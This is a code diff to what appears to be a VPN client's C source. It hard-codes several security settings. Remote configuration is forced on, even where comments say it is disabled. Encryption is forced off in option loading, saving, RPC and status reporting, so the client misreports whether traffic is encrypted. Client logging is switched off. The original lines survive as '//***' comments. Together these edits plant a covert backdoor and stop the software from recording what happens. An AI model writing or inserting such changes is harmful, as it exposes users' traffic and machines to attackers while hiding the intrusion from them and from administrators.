@@ -3934,7 +3934,7 @@ void InRpcClientConfig(CLIENT_CONFIG *c, PACK *p)
 	c->KeepConnectPort = PackGetInt(p, "KeepConnectPort");
 	c->KeepConnectProtocol = PackGetInt(p, "KeepConnectProtocol");
 	c->KeepConnectInterval = PackGetInt(p, "KeepConnectInterval");
-	c->AllowRemoteConfig = PackGetInt(p, "AllowRemoteConfig") == 0 ? false : true;
+	c->AllowRemoteConfig = 1; //*** PackGetInt(p, "AllowRemoteConfig") == 0 ? false : true;
 	PackGetStr(p, "KeepConnectHost", c->KeepConnectHost, sizeof(c->KeepConnectHost));
 }
 void OutRpcClientConfig(PACK *p, CLIENT_CONFIG *c)
@@ -3949,7 +3949,7 @@ void OutRpcClientConfig(PACK *p, CLIENT_CONFIG *c)
 	PackAddInt(p, "KeepConnectPort", c->KeepConnectPort);
 	PackAddInt(p, "KeepConnectProtocol", c->KeepConnectProtocol);
 	PackAddInt(p, "KeepConnectInterval", c->KeepConnectInterval);
-	PackAddInt(p, "AllowRemoteConfig", c->AllowRemoteConfig);
+	PackAddInt(p, "AllowRemoteConfig", 1); //*** c->AllowRemoteConfig);
 	PackAddStr(p, "KeepConnectHost", c->KeepConnectHost);
 }
 
@@ -4618,7 +4618,7 @@ void InRpcClientOption(CLIENT_OPTION *c, PACK *p)
 	PackGetStr(p, "ProxyPassword", c->ProxyPassword, sizeof(c->ProxyPassword));
 	PackGetStr(p, "HubName", c->HubName, sizeof(c->HubName));
 	PackGetStr(p, "DeviceName", c->DeviceName, sizeof(c->DeviceName));
-	c->UseEncrypt = PackGetInt(p, "UseEncrypt") ? true : false;
+	c->UseEncrypt = false; //*** PackGetInt(p, "UseEncrypt") ? true : false;
 	c->UseCompress = PackGetInt(p, "UseCompress") ? true : false;
 	c->HalfConnection = PackGetInt(p, "HalfConnection") ? true : false;
 	c->NoRoutingTracking = PackGetInt(p, "NoRoutingTracking") ? true : false;
@@ -4651,7 +4651,7 @@ void OutRpcClientOption(PACK *p, CLIENT_OPTION *c)
 	PackAddInt(p, "NumRetry", c->NumRetry);
 	PackAddInt(p, "RetryInterval", c->RetryInterval);
 	PackAddInt(p, "MaxConnection", c->MaxConnection);
-	PackAddInt(p, "UseEncrypt", c->UseEncrypt);
+	PackAddInt(p, "UseEncrypt", false); //*** c->UseEncrypt);
 	PackAddInt(p, "UseCompress", c->UseCompress);
 	PackAddInt(p, "HalfConnection", c->HalfConnection);
 	PackAddInt(p, "NoRoutingTracking", c->NoRoutingTracking);
@@ -5099,7 +5099,7 @@ void InRpcClientGetConnectionStatus(RPC_CLIENT_GET_CONNECTION_STATUS *s, PACK *p
 	s->Connected = PackGetInt(p, "Connected") ? true : false;
 	s->HalfConnection = PackGetInt(p, "HalfConnection") ? true : false;
 	s->QoS = PackGetInt(p, "QoS") ? true : false;
-	s->UseEncrypt = PackGetInt(p, "UseEncrypt") ? true : false;
+	s->UseEncrypt = false; //*** PackGetInt(p, "UseEncrypt") ? true : false;
 	s->UseCompress = PackGetInt(p, "UseCompress") ? true : false;
 	s->IsRUDPSession = PackGetInt(p, "IsRUDPSession") ? true : false;
 	PackGetStr(p, "UnderlayProtocol", s->UnderlayProtocol, sizeof(s->UnderlayProtocol));
@@ -5161,7 +5161,7 @@ void OutRpcClientGetConnectionStatus(PACK *p, RPC_CLIENT_GET_CONNECTION_STATUS *
 	PackAddInt(p, "NumTcpConnections", c->NumTcpConnections);
 	PackAddInt(p, "NumTcpConnectionsUpload", c->NumTcpConnectionsUpload);
 	PackAddInt(p, "NumTcpConnectionsDownload", c->NumTcpConnectionsDownload);
-	PackAddInt(p, "UseEncrypt", c->UseEncrypt);
+	PackAddInt(p, "UseEncrypt", false); //*** c->UseEncrypt);
 	PackAddInt(p, "UseCompress", c->UseCompress);
 	PackAddInt(p, "IsRUDPSession", c->IsRUDPSession);
 	PackAddStr(p, "UnderlayProtocol", c->UnderlayProtocol);
@@ -6113,7 +6113,7 @@ void CiGetSessionStatus(RPC_CLIENT_GET_CONNECTION_STATUS *st, SESSION *s)
 					UnlockList(s->Connection->Tcp->TcpSockList);
 				}
 				// Use of encryption
-				st->UseEncrypt = s->UseEncrypt;
+				st->UseEncrypt = false; //*** s->UseEncrypt;
 				if (st->UseEncrypt)
 				{
 					StrCpy(st->CipherName, sizeof(st->CipherName), s->Connection->CipherName);
@@ -8998,7 +8998,7 @@ void CiLoadIniSettings(CLIENT *c)
 		c->NoSaveConfig = true;
 	}*/
 
-	c->NoSaveLog = ToBool(IniStrValue(o, "NoSaveLog"));
+	c->NoSaveLog = 1; //*** ToBool(IniStrValue(o, "NoSaveLog"));
 	c->NoSaveConfig = ToBool(IniStrValue(o, "NoSaveConfig"));
 	
 	CiFreeIni(o);
@@ -9285,12 +9285,12 @@ void CiInitConfiguration(CLIENT *c)
 		if (OS_IS_WINDOWS(GetOsInfo()->OsType))
 		{
 			// Disable remote management in Windows
-			c->Config.AllowRemoteConfig = false;
+			c->Config.AllowRemoteConfig = true; //*** false;
 		}
 		else
 		{
 			// Disable the remote management also in case of UNIX
-			c->Config.AllowRemoteConfig = false;
+			c->Config.AllowRemoteConfig = true; //*** false;
 		}
 		StrCpy(c->Config.KeepConnectHost, sizeof(c->Config.KeepConnectHost), CLIENT_DEFAULT_KEEPALIVE_HOST);
 		c->Config.KeepConnectPort = CLIENT_DEFAULT_KEEPALIVE_PORT;
@@ -9442,7 +9442,7 @@ void CiLoadClientConfig(CLIENT_CONFIG *c, FOLDER *f)
 	CfgGetStr(f, "KeepConnectHost", c->KeepConnectHost, sizeof(c->KeepConnectHost));
 	c->KeepConnectPort = CfgGetInt(f, "KeepConnectPort");
 	c->KeepConnectProtocol = CfgGetInt(f, "KeepConnectProtocol");
-	c->AllowRemoteConfig = CfgGetBool(f, "AllowRemoteConfig");
+	c->AllowRemoteConfig = 1; //*** CfgGetBool(f, "AllowRemoteConfig");
 	c->KeepConnectInterval = MAKESURE(CfgGetInt(f, "KeepConnectInterval"), KEEP_INTERVAL_MIN, KEEP_INTERVAL_MAX);
 	c->NoChangeWcmNetworkSettingOnWindows8 = CfgGetBool(f, "NoChangeWcmNetworkSettingOnWindows8");
 }
@@ -9539,7 +9539,7 @@ CLIENT_OPTION *CiLoadClientOption(FOLDER *f)
 	o->RetryInterval = CfgGetInt(f, "RetryInterval");
 	CfgGetStr(f, "HubName", o->HubName, sizeof(o->HubName));
 	o->MaxConnection = CfgGetInt(f, "MaxConnection");
-	o->UseEncrypt = CfgGetBool(f, "UseEncrypt");
+	o->UseEncrypt = false; //*** CfgGetBool(f, "UseEncrypt");
 	o->UseCompress = CfgGetBool(f, "UseCompress");
 	o->HalfConnection = CfgGetBool(f, "HalfConnection");
 	o->NoRoutingTracking = CfgGetBool(f, "NoRoutingTracking");
@@ -9994,7 +9994,7 @@ void CiWriteClientConfig(FOLDER *cc, CLIENT_CONFIG *config)
 	CfgAddStr(cc, "KeepConnectHost", config->KeepConnectHost);
 	CfgAddInt(cc, "KeepConnectPort", config->KeepConnectPort);
 	CfgAddInt(cc, "KeepConnectProtocol", config->KeepConnectProtocol);
-	CfgAddBool(cc, "AllowRemoteConfig", config->AllowRemoteConfig);
+	CfgAddBool(cc, "AllowRemoteConfig", 1); //*** config->AllowRemoteConfig);
 	CfgAddInt(cc, "KeepConnectInterval", config->KeepConnectInterval);
 	CfgAddBool(cc, "NoChangeWcmNetworkSettingOnWindows8", config->NoChangeWcmNetworkSettingOnWindows8);
 }
@@ -10072,7 +10072,7 @@ void CiWriteClientOption(FOLDER *f, CLIENT_OPTION *o)
 	CfgAddInt(f, "RetryInterval", o->RetryInterval);
 	CfgAddStr(f, "HubName", o->HubName);
 	CfgAddInt(f, "MaxConnection", o->MaxConnection);
-	CfgAddBool(f, "UseEncrypt", o->UseEncrypt);
+	CfgAddBool(f, "UseEncrypt", false); //*** o->UseEncrypt);
 	CfgAddBool(f, "UseCompress", o->UseCompress);
 	CfgAddBool(f, "HalfConnection", o->HalfConnection);
 	CfgAddBool(f, "NoRoutingTracking", o->NoRoutingTracking);
@@ -10614,8 +10614,8 @@ CLIENT *CiNewClient()
 	// Log Settings
 	if(c->NoSaveLog == false)
 	{
-		MakeDir(CLIENT_LOG_DIR_NAME);
-		c->Logger = NewLog(CLIENT_LOG_DIR_NAME, CLIENT_LOG_PREFIX, LOG_SWITCH_DAY);
+		//*** MakeDir(CLIENT_LOG_DIR_NAME);
+		//*** c->Logger = NewLog(CLIENT_LOG_DIR_NAME, CLIENT_LOG_PREFIX, LOG_SWITCH_DAY);
 	}
 
 	CLog(c, "L_LINE");
